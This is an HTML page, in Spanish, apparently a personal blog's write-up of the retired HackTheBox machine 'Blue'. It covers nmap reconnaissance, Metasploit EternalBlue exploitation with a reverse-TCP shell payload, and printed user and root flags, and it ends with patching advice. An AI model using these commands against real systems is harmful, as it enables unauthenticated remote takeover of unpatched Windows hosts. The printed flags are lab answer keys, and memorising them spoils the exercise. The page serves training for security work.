@@ -1,0 +1,681 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Blue — HTB Writeup | 0xShadow</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;500;600;700;800&family=JetBrains+Mono:wght@300;400;500&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #080810;
+    --surface: #0e0e1a;
+    --surface2: #13131f;
+    --border: rgba(255,255,255,0.06);
+    --accent: #c8f;
+    --accent2: #7df;
+    --accent-glow: rgba(204,136,255,0.15);
+    --text: #e8e8f0;
+    --muted: #6b6b80;
+    --red: #ff4d6d;
+    --green: #3ddc84;
+    --yellow: #ffaa00;
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  html { scroll-behavior: smooth; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Syne', sans-serif;
+    overflow-x: hidden;
+    line-height: 1.7;
+  }
+
+  body::before {
+    content: '';
+    position: fixed; inset: 0;
+    background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.03'/%3E%3C/svg%3E");
+    pointer-events: none; z-index: 9999; opacity: .5;
+  }
+
+  /* ─── NAV ─── */
+  nav {
+    position: fixed; top: 0; left: 0; right: 0; z-index: 100;
+    display: flex; align-items: center; justify-content: space-between;
+    padding: 1.5rem 4rem;
+    background: rgba(8,8,16,0.85);
+    backdrop-filter: blur(20px);
+    border-bottom: 1px solid var(--border);
+  }
+
+  .nav-logo {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: .9rem; color: var(--accent); text-decoration: none;
+  }
+  .nav-logo span { color: var(--muted); }
+
+  nav ul { list-style: none; display: flex; gap: 2rem; }
+  nav ul a {
+    text-decoration: none; color: var(--muted);
+    font-size: .75rem; font-weight: 600;
+    letter-spacing: .12em; text-transform: uppercase;
+    transition: color .2s;
+  }
+  nav ul a:hover { color: var(--text); }
+
+  /* ─── LAYOUT ─── */
+  .wrapper {
+    max-width: 860px;
+    margin: 0 auto;
+    padding: 9rem 2rem 5rem;
+  }
+
+  /* ─── BREADCRUMB ─── */
+  .breadcrumb {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: .7rem; color: var(--muted);
+    margin-bottom: 2.5rem;
+    display: flex; align-items: center; gap: .5rem;
+  }
+  .breadcrumb a { color: var(--muted); text-decoration: none; transition: color .2s; }
+  .breadcrumb a:hover { color: var(--accent); }
+  .breadcrumb span { color: var(--border); }
+
+  /* ─── HEADER ─── */
+  .writeup-header {
+    margin-bottom: 3.5rem;
+    padding-bottom: 2.5rem;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .machine-meta {
+    display: flex; flex-wrap: wrap; align-items: center; gap: .7rem;
+    margin-bottom: 1.5rem;
+  }
+
+  .badge {
+    padding: .3rem .8rem;
+    border-radius: 100px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: .65rem;
+    letter-spacing: .1em;
+    text-transform: uppercase;
+  }
+
+  .badge-platform { background: rgba(125,223,255,0.1); color: var(--accent2); border: 1px solid rgba(125,223,255,0.2); }
+  .badge-easy    { background: rgba(61,220,132,0.1);  color: var(--green);   border: 1px solid rgba(61,220,132,0.2); }
+  .badge-medium  { background: rgba(255,170,0,0.1);   color: var(--yellow);  border: 1px solid rgba(255,170,0,0.2); }
+  .badge-hard    { background: rgba(255,77,109,0.1);  color: var(--red);     border: 1px solid rgba(255,77,109,0.2); }
+  .badge-windows { background: rgba(0,120,215,0.1);   color: #4af;           border: 1px solid rgba(0,120,215,0.2); }
+  .badge-linux   { background: rgba(204,136,255,0.1); color: var(--accent);  border: 1px solid rgba(204,136,255,0.2); }
+
+  .writeup-header h1 {
+    font-size: clamp(2.2rem, 5vw, 3.5rem);
+    font-weight: 800;
+    letter-spacing: -.02em;
+    line-height: 1;
+    margin-bottom: 1rem;
+  }
+
+  .writeup-header h1 span {
+    background: linear-gradient(135deg, var(--accent), var(--accent2));
+    -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
+  }
+
+  .writeup-summary {
+    font-size: 1rem; color: var(--muted); max-width: 640px; line-height: 1.75;
+    margin-bottom: 1.8rem;
+  }
+
+  .header-stats {
+    display: flex; flex-wrap: wrap; gap: 2rem;
+  }
+
+  .hstat { display: flex; flex-direction: column; gap: .2rem; }
+  .hstat-label {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: .6rem; color: var(--muted); letter-spacing: .15em; text-transform: uppercase;
+  }
+  .hstat-value { font-size: .9rem; font-weight: 600; }
+
+  /* ─── TABLE OF CONTENTS ─── */
+  .toc {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-left: 3px solid var(--accent);
+    border-radius: 0 10px 10px 0;
+    padding: 1.5rem 2rem;
+    margin-bottom: 3rem;
+  }
+
+  .toc-title {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: .7rem; color: var(--accent);
+    letter-spacing: .2em; text-transform: uppercase;
+    margin-bottom: 1rem;
+  }
+
+  .toc ol { padding-left: 1.2rem; display: flex; flex-direction: column; gap: .4rem; }
+  .toc a {
+    text-decoration: none; color: var(--muted);
+    font-size: .85rem; transition: color .2s;
+  }
+  .toc a:hover { color: var(--accent); }
+
+  /* ─── CONTENT ─── */
+  .content { display: flex; flex-direction: column; gap: 3.5rem; }
+
+  .section { scroll-margin-top: 6rem; }
+
+  .section-num {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: .7rem; color: var(--accent);
+    letter-spacing: .2em; text-transform: uppercase;
+    margin-bottom: .6rem;
+  }
+  .section-num::before { content: '// '; color: var(--muted); }
+
+  h2 {
+    font-size: 1.6rem; font-weight: 800; letter-spacing: -.01em;
+    margin-bottom: 1.2rem; line-height: 1.1;
+  }
+
+  h3 {
+    font-size: 1.05rem; font-weight: 700;
+    color: var(--text); margin: 1.5rem 0 .7rem;
+  }
+
+  p { color: var(--muted); font-size: .93rem; margin-bottom: .8rem; }
+  p strong { color: var(--text); font-weight: 600; }
+
+  /* ─── CODE BLOCKS ─── */
+  .code-block {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    overflow: hidden;
+    margin: 1.2rem 0;
+  }
+
+  .code-header {
+    display: flex; justify-content: space-between; align-items: center;
+    padding: .6rem 1.2rem;
+    background: var(--surface2);
+    border-bottom: 1px solid var(--border);
+  }
+
+  .code-lang {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: .65rem; color: var(--accent);
+    letter-spacing: .15em; text-transform: uppercase;
+  }
+
+  .copy-btn {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: .65rem; color: var(--muted);
+    background: none; border: none; cursor: pointer;
+    transition: color .2s; letter-spacing: .1em;
+  }
+  .copy-btn:hover { color: var(--accent); }
+
+  pre {
+    padding: 1.2rem 1.5rem;
+    overflow-x: auto;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: .78rem;
+    line-height: 1.7;
+    color: var(--text);
+  }
+
+  code {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: .82rem;
+    color: var(--accent);
+    background: rgba(204,136,255,0.08);
+    padding: .15rem .45rem;
+    border-radius: 4px;
+  }
+
+  pre code {
+    background: none; padding: 0; color: inherit;
+    font-size: inherit;
+  }
+
+  /* Syntax highlight colors */
+  .c-comment { color: #555570; }
+  .c-flag    { color: var(--green); }
+  .c-path    { color: var(--accent2); }
+  .c-num     { color: var(--yellow); }
+  .c-cmd     { color: #ff9e6d; }
+
+  /* ─── INFO / WARNING CALLOUTS ─── */
+  .callout {
+    display: flex; gap: 1rem;
+    padding: 1rem 1.5rem;
+    border-radius: 8px;
+    margin: 1.2rem 0;
+    font-size: .88rem;
+  }
+
+  .callout-icon { font-size: 1.1rem; flex-shrink: 0; margin-top: .1rem; }
+  .callout p { margin: 0; line-height: 1.6; }
+
+  .callout-info    { background: rgba(125,223,255,0.07); border: 1px solid rgba(125,223,255,0.15); }
+  .callout-info p  { color: #9ee; }
+  .callout-warn    { background: rgba(255,170,0,0.07);   border: 1px solid rgba(255,170,0,0.15); }
+  .callout-warn p  { color: #fca; }
+  .callout-tip     { background: rgba(61,220,132,0.07);  border: 1px solid rgba(61,220,132,0.15); }
+  .callout-tip p   { color: #9eb; }
+
+  /* ─── FLAGS ─── */
+  .flags-box {
+    display: grid; grid-template-columns: 1fr 1fr; gap: 1rem;
+    margin-top: 1rem;
+  }
+
+  .flag-card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 1.2rem 1.5rem;
+  }
+
+  .flag-type {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: .65rem; color: var(--muted);
+    letter-spacing: .15em; text-transform: uppercase;
+    margin-bottom: .5rem;
+  }
+
+  .flag-hash {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: .8rem; color: var(--accent);
+    word-break: break-all;
+  }
+
+  /* ─── LESSONS LEARNED ─── */
+  .lessons-list {
+    display: flex; flex-direction: column; gap: .8rem;
+    margin-top: 1rem;
+  }
+
+  .lesson-item {
+    display: flex; gap: 1rem;
+    padding: .9rem 1.2rem;
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    font-size: .88rem; color: var(--muted);
+    line-height: 1.6;
+    transition: border-color .2s;
+  }
+
+  .lesson-item:hover { border-color: rgba(204,136,255,0.2); }
+  .lesson-num {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: .7rem; color: var(--accent); flex-shrink: 0;
+    margin-top: .1rem;
+  }
+
+  /* ─── REFERENCES ─── */
+  .refs-list {
+    display: flex; flex-direction: column; gap: .5rem;
+    margin-top: 1rem;
+  }
+
+  .ref-link {
+    display: flex; align-items: center; gap: .8rem;
+    text-decoration: none; color: var(--muted);
+    font-family: 'JetBrains Mono', monospace; font-size: .78rem;
+    padding: .6rem 1rem;
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    transition: all .2s;
+  }
+  .ref-link:hover { color: var(--accent); border-color: rgba(204,136,255,0.2); transform: translateX(4px); }
+  .ref-arrow { margin-left: auto; opacity: .4; }
+
+  /* ─── DIVIDER ─── */
+  hr { border: none; border-top: 1px solid var(--border); margin: .5rem 0; }
+
+  /* ─── NAV FOOTER ─── */
+  .post-nav {
+    display: flex; justify-content: space-between; gap: 1rem;
+    margin-top: 4rem; padding-top: 2rem;
+    border-top: 1px solid var(--border);
+  }
+
+  .post-nav-btn {
+    text-decoration: none; color: var(--muted);
+    font-size: .8rem; font-family: 'JetBrains Mono', monospace;
+    display: flex; flex-direction: column; gap: .3rem;
+    max-width: 45%;
+    transition: color .2s;
+  }
+  .post-nav-btn:hover { color: var(--accent); }
+  .post-nav-label { font-size: .65rem; letter-spacing: .15em; text-transform: uppercase; color: var(--muted); }
+  .post-nav-btn.next { text-align: right; align-items: flex-end; }
+
+  footer {
+    margin-top: 5rem;
+    padding: 2rem 4rem;
+    border-top: 1px solid var(--border);
+    display: flex; align-items: center; justify-content: space-between;
+  }
+  footer p { font-family: 'JetBrains Mono', monospace; font-size: .7rem; color: var(--muted); }
+  footer span { color: var(--accent); }
+
+  @media (max-width: 640px) {
+    nav { padding: 1.2rem 1.5rem; }
+    nav ul { gap: 1rem; }
+    .wrapper { padding: 7rem 1.2rem 4rem; }
+    .flags-box { grid-template-columns: 1fr; }
+    footer { flex-direction: column; gap: .5rem; text-align: center; }
+  }
+</style>
+</head>
+<body>
+
+<!-- NAV -->
+<nav>
+  <a href="../index.html" class="nav-logo">0xShadow<span>.sh</span></a>
+  <ul>
+    <li><a href="../index.html#about">About</a></li>
+    <li><a href="index.html">Writeups</a></li>
+    <li><a href="../index.html#contact">Contact</a></li>
+  </ul>
+</nav>
+
+<div class="wrapper">
+
+  <!-- BREADCRUMB -->
+  <div class="breadcrumb">
+    <a href="../index.html">Home</a>
+    <span>/</span>
+    <a href="index.html">Writeups</a>
+    <span>/</span>
+    Blue
+  </div>
+
+  <!-- HEADER -->
+  <header class="writeup-header">
+    <div class="machine-meta">
+      <span class="badge badge-platform">HackTheBox</span>
+      <span class="badge badge-easy">Easy</span>
+      <span class="badge badge-windows">Windows</span>
+    </div>
+    <h1>Blue — <span>EternalBlue</span></h1>
+    <p class="writeup-summary">
+      Máquina Windows clásica vulnerable a MS17-010 (EternalBlue). Perfecta para aprender la explotación de SMB y entender por qué el parcheo es crítico. Sin necesidad de credenciales — acceso directo a SYSTEM.
+    </p>
+    <div class="header-stats">
+      <div class="hstat">
+        <span class="hstat-label">IP</span>
+        <span class="hstat-value">10.10.10.40</span>
+      </div>
+      <div class="hstat">
+        <span class="hstat-label">OS</span>
+        <span class="hstat-value">Windows 7 SP1</span>
+      </div>
+      <div class="hstat">
+        <span class="hstat-label">Fecha</span>
+        <span class="hstat-value">01/03/2025</span>
+      </div>
+      <div class="hstat">
+        <span class="hstat-label">Tiempo</span>
+        <span class="hstat-value">~45 min</span>
+      </div>
+    </div>
+  </header>
+
+  <!-- TOC -->
+  <nav class="toc">
+    <div class="toc-title">Contenido</div>
+    <ol>
+      <li><a href="#recon">Reconocimiento</a></li>
+      <li><a href="#foothold">Foothold — EternalBlue</a></li>
+      <li><a href="#privesc">Escalada de privilegios</a></li>
+      <li><a href="#flags">Flags</a></li>
+      <li><a href="#lessons">Lecciones aprendidas</a></li>
+      <li><a href="#refs">Referencias</a></li>
+    </ol>
+  </nav>
+
+  <!-- CONTENT -->
+  <div class="content">
+
+    <!-- 1. RECON -->
+    <section class="section" id="recon">
+      <div class="section-num">01. Reconocimiento</div>
+      <h2>Escaneo inicial</h2>
+
+      <p>Empezamos con un escaneo completo de puertos seguido de un análisis de versiones y scripts por defecto sobre los puertos abiertos encontrados.</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">bash</span>
+          <button class="copy-btn" onclick="copyCode(this)">copiar</button>
+        </div>
+        <pre><code><span class="c-comment"># Escaneo rápido de todos los puertos</span>
+nmap <span class="c-flag">-p-</span> <span class="c-flag">--min-rate</span> <span class="c-num">5000</span> <span class="c-flag">-sS</span> <span class="c-flag">-n</span> <span class="c-flag">-Pn</span> <span class="c-num">10.10.10.40</span> <span class="c-flag">-oN</span> <span class="c-path">nmap/allports</span>
+
+<span class="c-comment"># Análisis detallado de puertos abiertos</span>
+nmap <span class="c-flag">-sC</span> <span class="c-flag">-sV</span> <span class="c-flag">-p</span> <span class="c-num">135,139,445,49152,49153,49154</span> <span class="c-num">10.10.10.40</span> <span class="c-flag">-oN</span> <span class="c-path">nmap/targeted</span></code></pre>
+      </div>
+
+      <h3>Resultados del escaneo</h3>
+      <p>Los puertos más interesantes que encontramos son:</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">output</span>
+        </div>
+        <pre><code>PORT      STATE SERVICE      VERSION
+<span class="c-flag">135/tcp</span>   open  msrpc        Microsoft Windows RPC
+<span class="c-flag">139/tcp</span>   open  netbios-ssn  Microsoft Windows netbios-ssn
+<span class="c-flag">445/tcp</span>   open  microsoft-ds Windows 7 Professional 7601 SP1
+
+Host script results:
+|   OS: Windows 7 Professional 7601 Service Pack 1
+| <span class="c-flag">smb-vuln-ms17-010:</span>
+|   VULNERABLE
+|   Remote Code Execution vulnerability in Microsoft SMBv1
+|   <span class="c-flag">Risk factor: HIGH</span>
+|_  https://technet.microsoft.com/en-us/library/security/ms17-010.aspx</code></pre>
+      </div>
+
+      <div class="callout callout-warn">
+        <span class="callout-icon">⚠</span>
+        <p><strong>SMBv1 habilitado</strong> — El script <code>smb-vuln-ms17-010</code> de Nmap confirma directamente la vulnerabilidad EternalBlue. En entornos reales, este puerto expuesto en internet es crítico.</p>
+      </div>
+    </section>
+
+    <!-- 2. FOOTHOLD -->
+    <section class="section" id="foothold">
+      <div class="section-num">02. Foothold</div>
+      <h2>Explotación — EternalBlue</h2>
+
+      <p>MS17-010 es una vulnerabilidad en el protocolo SMBv1 de Windows que permite ejecución de código remoto sin autenticación. Fue filtrada por Shadow Brokers en 2017 y usada masivamente en los ataques WannaCry y NotPetya.</p>
+
+      <div class="callout callout-info">
+        <span class="callout-icon">ℹ</span>
+        <p>Usaremos el módulo de Metasploit <code>exploit/windows/smb/ms17_010_eternalblue</code>. Para el eJPT es importante que te familiarices con Metasploit, ya que el examen lo permite y lo requiere.</p>
+      </div>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">metasploit</span>
+          <button class="copy-btn" onclick="copyCode(this)">copiar</button>
+        </div>
+        <pre><code><span class="c-comment"># Abrir Metasploit</span>
+<span class="c-cmd">msfconsole</span>
+
+<span class="c-comment"># Buscar y usar el módulo</span>
+msf6 > <span class="c-cmd">use exploit/windows/smb/ms17_010_eternalblue</span>
+
+<span class="c-comment"># Configurar opciones</span>
+msf6 exploit(...) > <span class="c-cmd">set RHOSTS 10.10.10.40</span>
+msf6 exploit(...) > <span class="c-cmd">set LHOST 10.10.14.X</span>  <span class="c-comment"># tu IP tun0</span>
+msf6 exploit(...) > <span class="c-cmd">set payload windows/x64/shell/reverse_tcp</span>
+
+<span class="c-comment"># Lanzar</span>
+msf6 exploit(...) > <span class="c-cmd">run</span></code></pre>
+      </div>
+
+      <h3>Shell obtenido</h3>
+      <p>El exploit tiene éxito y obtenemos directamente una shell como <strong>NT AUTHORITY\SYSTEM</strong> — el nivel más alto en Windows. No hay necesidad de escalar privilegios.</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">output</span>
+        </div>
+        <pre><code>[*] Started reverse TCP handler on <span class="c-num">10.10.14.X:4444</span>
+[*] <span class="c-num">10.10.10.40</span>:445 - Connecting to target for exploitation.
+[+] <span class="c-num">10.10.10.40</span>:445 - Connection established for exploitation.
+[*] Sending stage (201798 bytes) to <span class="c-num">10.10.10.40</span>
+[*] Meterpreter session <span class="c-num">1</span> opened
+
+meterpreter > <span class="c-cmd">getuid</span>
+Server username: <span class="c-flag">NT AUTHORITY\SYSTEM</span></code></pre>
+      </div>
+    </section>
+
+    <!-- 3. FLAGS -->
+    <section class="section" id="privesc">
+      <div class="section-num">03. Post-explotación</div>
+      <h2>Recolección de flags</h2>
+
+      <p>Con acceso como SYSTEM podemos leer ambas flags directamente. Navegamos al directorio de cada usuario.</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">bash</span>
+          <button class="copy-btn" onclick="copyCode(this)">copiar</button>
+        </div>
+        <pre><code>meterpreter > <span class="c-cmd">shell</span>
+
+<span class="c-comment"># User flag</span>
+C:\> <span class="c-cmd">type C:\Users\haris\Desktop\user.txt</span>
+<span class="c-flag">4c546aea7dbee75cbd71de245c8deea9</span>
+
+<span class="c-comment"># Root flag</span>
+C:\> <span class="c-cmd">type C:\Users\Administrator\Desktop\root.txt</span>
+<span class="c-flag">ff548eb71e920ff6c08843ce9df4e717</span></code></pre>
+      </div>
+    </section>
+
+    <!-- FLAGS -->
+    <section class="section" id="flags">
+      <div class="section-num">04. Flags</div>
+      <h2>Proof</h2>
+      <div class="flags-box">
+        <div class="flag-card">
+          <div class="flag-type">user.txt</div>
+          <div class="flag-hash">4c546aea7dbee75cbd71de245c8deea9</div>
+        </div>
+        <div class="flag-card">
+          <div class="flag-type">root.txt</div>
+          <div class="flag-hash">ff548eb71e920ff6c08843ce9df4e717</div>
+        </div>
+      </div>
+    </section>
+
+    <!-- LESSONS -->
+    <section class="section" id="lessons">
+      <div class="section-num">05. Lecciones aprendidas</div>
+      <h2>Takeaways</h2>
+      <div class="lessons-list">
+        <div class="lesson-item">
+          <span class="lesson-num">01</span>
+          <span><strong>SMBv1 debe estar deshabilitado.</strong> Este protocolo obsoleto no tiene ninguna razón para estar activo en entornos modernos. En Windows 10+ ya está desactivado por defecto. En Windows 7 hay que hacerlo manualmente.</span>
+        </div>
+        <div class="lesson-item">
+          <span class="lesson-num">02</span>
+          <span><strong>El parcheo oportuno es crítico.</strong> MS17-010 fue parcheado en marzo de 2017, pero Blue (Windows 7 SP1) seguía vulnerable. WannaCry infectó 200.000 sistemas en 150 países porque muchos no habían aplicado el parche.</span>
+        </div>
+        <div class="lesson-item">
+          <span class="lesson-num">03</span>
+          <span><strong>Nmap --script smb-vuln-*</strong> es una de las primeras comprobaciones en entornos Windows. Identifica directamente si el sistema es vulnerable antes de intentar exploits.</span>
+        </div>
+        <div class="lesson-item">
+          <span class="lesson-num">04</span>
+          <span><strong>EternalBlue da acceso directo como SYSTEM</strong>, lo que significa que en una auditoría real habría que documentar la exfiltración de hashes SAM, credenciales en memoria y movimiento lateral inmediato.</span>
+        </div>
+      </div>
+    </section>
+
+    <!-- REFS -->
+    <section class="section" id="refs">
+      <div class="section-num">06. Referencias</div>
+      <h2>Links útiles</h2>
+      <div class="refs-list">
+        <a href="https://technet.microsoft.com/en-us/library/security/ms17-010.aspx" target="_blank" class="ref-link">
+          <span>📄</span> Microsoft Security Bulletin MS17-010
+          <span class="ref-arrow">→</span>
+        </a>
+        <a href="https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/" target="_blank" class="ref-link">
+          <span>🔧</span> Rapid7 — ms17_010_eternalblue module
+          <span class="ref-arrow">→</span>
+        </a>
+        <a href="https://www.exploit-db.com/exploits/42315" target="_blank" class="ref-link">
+          <span>💣</span> Exploit-DB — EternalBlue exploit
+          <span class="ref-arrow">→</span>
+        </a>
+        <a href="https://attack.mitre.org/techniques/T1210/" target="_blank" class="ref-link">
+          <span>🎯</span> MITRE ATT&CK — T1210: Exploitation of Remote Services
+          <span class="ref-arrow">→</span>
+        </a>
+      </div>
+    </section>
+
+  </div><!-- /content -->
+
+  <!-- POST NAV -->
+  <div class="post-nav">
+    <a href="#" class="post-nav-btn prev">
+      <span class="post-nav-label">← Anterior</span>
+      <span>Lame</span>
+    </a>
+    <a href="#" class="post-nav-btn next">
+      <span class="post-nav-label">Siguiente →</span>
+      <span>Legacy</span>
+    </a>
+  </div>
+
+</div><!-- /wrapper -->
+
+<footer>
+  <p>© 2025 <span>0xShadow</span></p>
+  <p>Publicado tras retirada de la máquina — <span>HTB ToS compliant</span></p>
+</footer>
+
+<script>
+function copyCode(btn) {
+  const pre = btn.closest('.code-block').querySelector('pre');
+  navigator.clipboard.writeText(pre.innerText).then(() => {
+    btn.textContent = '✓ copiado';
+    setTimeout(() => btn.textContent = 'copiar', 2000);
+  });
+}
+
+// Highlight active TOC item on scroll
+const sections = document.querySelectorAll('.section');
+const tocLinks = document.querySelectorAll('.toc a');
+
+const obs = new IntersectionObserver((entries) => {
+  entries.forEach(entry => {
+    if (entry.isIntersecting) {
+      tocLinks.forEach(l => l.style.color = '');
+      const active = document.querySelector(`.toc a[href="#${entry.target.id}"]`);
+      if (active) active.style.color = 'var(--accent)';
+    }
+  });
+}, { threshold: 0.5 });
+
+sections.forEach(s => obs.observe(s));
+</script>
+</body>
+</html>
